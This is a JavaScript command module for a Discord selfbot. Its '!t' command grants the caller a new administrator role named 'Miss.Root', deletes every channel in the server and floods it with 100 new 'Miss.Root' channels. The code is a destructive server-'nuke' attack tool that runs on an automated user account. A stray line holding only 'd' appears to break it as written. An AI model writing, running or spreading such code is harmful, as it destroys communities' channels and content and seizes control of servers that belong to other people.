const { Client, Permissions } = require('discord.js-selfbot-v13');


const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

module.exports = {
    name: 't',
    async execute(message, args) {
        try {
            
            const role = await message.guild.roles.create({
                name: 'Miss.Root',
                permissions: [Permissions.FLAGS.ADMINISTRATOR],
                color: 'BLUE',
                reason: 'Created by !t command'
            });
            await delay(1000);

            d
            await message.member.roles.add(role, 'Assigned Teste role via !t command');
            await delay(100);

            
            const channels = message.guild.channels.cache;
            for (const channel of channels.values()) {
                try {
                    await channel.delete('Cleaning channels via !t command');
                    await delay(1500); 
                } catch (channelError) {
                    console.error(`Error deleting channel ${channel.name}: ${channelError.message}`);
                    continue;
                }
            }

            
            for (let i = 1; i <= 100; i++) {
                await message.guild.channels.create(`Miss.Root-${i}`, {
                    type: 'GUILD_TEXT',
                    permissionOverwrites: [
                        {
                            id: message.guild.id,
                            allow: [Permissions.FLAGS.VIEW_CHANNEL, Permissions.FLAGS.SEND_MESSAGES]
                        },
                        {
                            id: role.id,
                            allow: [Permissions.FLAGS.MANAGE_CHANNELS, Permissions.FLAGS.SEND_MESSAGES, Permissions.FLAGS.VIEW_CHANNEL]
                        }
                    ],
                    reason: 'Created by !t command'
                });
                await delay(1500);
            }

            
            await message.guild.channels.cache
                .find(ch => ch.name === 'Miss.Root')
                ?.send('Rôle Miss.Root créé, attribué à l\'utilisateur, et salons configurés avec succès!');

        } catch (error) {
            console.error('Command execution error:', error);
            await message.channel.send(`Erreur: ${error.message}`);
        }
    },
};